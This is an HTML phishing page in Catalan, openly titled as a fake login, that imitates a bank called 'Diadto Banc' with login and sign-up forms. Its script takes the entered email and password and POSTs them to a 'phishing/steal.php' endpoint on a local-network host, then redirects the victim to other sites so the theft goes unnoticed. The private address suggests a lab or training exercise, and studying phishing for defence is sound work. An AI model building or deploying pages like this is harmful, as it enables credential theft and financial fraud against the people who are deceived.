<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Diadto Inici de Sessió Fals</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container, .register-container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
            width: 350px;
            padding: 40px;
            transition: all 0.3s ease;
        }

        .login-container:hover, .register-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        .login-header, .register-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h1, .register-header h1{
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .login-header p, .register-header p {
            color: #666;
            font-size: 14px;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            border-color: #764ba2;
            outline: none;
            box-shadow: 0 0 0 3px rgba(118, 75, 162, 0.2);
        }

        .input-group label {
            position: absolute;
            top: 15px;
            left: 15px;
            color: #999;
            font-size: 14px;
            pointer-events: none;
            transition: all 0.3s ease;
        }

        .input-group input:focus + label,
        .input-group input:valid + label {
            top: -10px;
            left: 10px;
            font-size: 12px;
            background-color: white;
            padding: 0 5px;
            color: #764ba2;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            margin-left: 3px;
        }

        .remember-me input {
            margin-right: 5px;
        }

        .forgot-password a {
            color: #764ba2;
            text-decoration: none;
        }

        .login-button, .register-button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(to right, #667eea, #764ba2);
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .login-button:hover, .register-button:hover {
            background: linear-gradient(to right, #764ba2, #667eea);
            transform: translateY(-2px);
        }

        .signup-link {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .signup-link a {
            color: #764ba2;
            text-decoration: none;
            font-weight: bold;
            cursor: pointer;
        }

        .hidden {
            display: none;
        }
    </style>
</head>

<body>
    <div class="login-container" id="loginContainer">
        <div class="login-header">
            <h1>Benvingut</h1>
            <p>Inicia Sessió per continuar</p>
        </div>
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="loginEmail" required>
                <label for="loginEmail">Correu</label>
            </div>
            <div class="input-group">
                <input type="password" id="loginPassword" required>
                <label for="loginPassword">Contrasenya</label>
            </div>
            <div class="remember-forgot">
                <div class="remember-me">
                    <input type="checkbox" id="remember">
                    <label for="remember">Recorda'm</label>
                </div>
                <div class="forgot-password">
                    <a href="#">Has oblidat la contrasenya?</a>
                </div>
            </div>
            <button type="submit" class="login-button">Iniciar Sessió</button>
        </form>
        <div class="signup-link">
            Et's nou aquí? <a id="showRegister">Regístra't</a>
        </div>
    </div>

    <div class="register-container hidden" id="registerContainer">
        <div class="register-header">
            <h1>Benvingut</h1>
            <p>Registra't per utilitzar Diadto Banc</p>
        </div>

        <form id="registerForm">
            <div class="input-group">
                <input type="email" id="registerEmail" required>
                <label for="registerEmail">Correu</label>
            </div>
            <div class="input-group">
                <input type="text" id="registerUsername" required>
                <label for="registerUsername">Usuari</label>
            </div>
            <div class="input-group">
                <input type="password" id="registerPassword" required>
                <label for="registerPassword">Contrasenya</label>
            </div>
            <button type="submit" class="register-button" id="">Registrar-se</button>
            <div class="signup-link">
                Ja tens un compte creat? <a id="showLogin">Inicia Sessió</a>
            </div>
        </form>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginContainer = document.getElementById('loginContainer');
            const registerContainer = document.getElementById('registerContainer');
            const showRegister = document.getElementById('showRegister');
            const showLogin = document.getElementById('showLogin');

            showRegister.addEventListener('click', function(e) {
                e.preventDefault();
                loginContainer.classList.add('hidden');
                registerContainer.classList.remove('hidden');
            });

            showLogin.addEventListener('click', function(e) {
                e.preventDefault();
                registerContainer.classList.add('hidden');
                loginContainer.classList.remove('hidden');
            });

            const inputs = document.querySelectorAll('.input-group input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentNode.classList.add('focus');
                });

                input.addEventListener('blur', function() {
                    if (this.value === '') {
                        this.parentNode.classList.remove('focus');
                    }
                });

                if (input.value !== '') {
                    input.parentNode.classList.add('focus');
                }
            });

            const submit_register_button = document.querySelector('.register-button');
            const submit_login_button = document.querySelector('.login-button');

            submit_login_button.addEventListener('click', async (e) => {
                e.preventDefault();
                const credenciales = {
                email: document.getElementById('loginEmail').value,
                password: document.getElementById('loginPassword').value
            };

            try {
                const response = await fetch('http://192.168.1.55/phishing/steal.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(credenciales)
                });
                
                if (!response.ok) throw new Error('Error en el servidor');
                
                setTimeout(() => {
                    window.location.href = "https://v4tox3n.github.io";
                }, 1000);
                
            } catch (error) {
                console.error("Error:", error);
                alert("Error de conexió. Intenta-ho de nou.");
            }
            });

            submit_register_button.addEventListener('click', async (e) => {
                e.preventDefault();
                const credenciales = {
                email: document.getElementById('registerEmail').value,
                password: document.getElementById('registerPassword').value
            };

            try {
                const response = await fetch('http://192.168.1.55/phishing/steal.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(credenciales)
                });
                
                if (!response.ok) throw new Error('Error en el servidor');
                
                setTimeout(() => {
                    window.location.href = "https://www.bancoreal.com";
                }, 1000);
                
            } catch (error) {
                console.error("Error:", error);
                alert("Error de conexió. Intenta-ho de nou.");
            }
            });
        });
    </script>
</body>
</html>
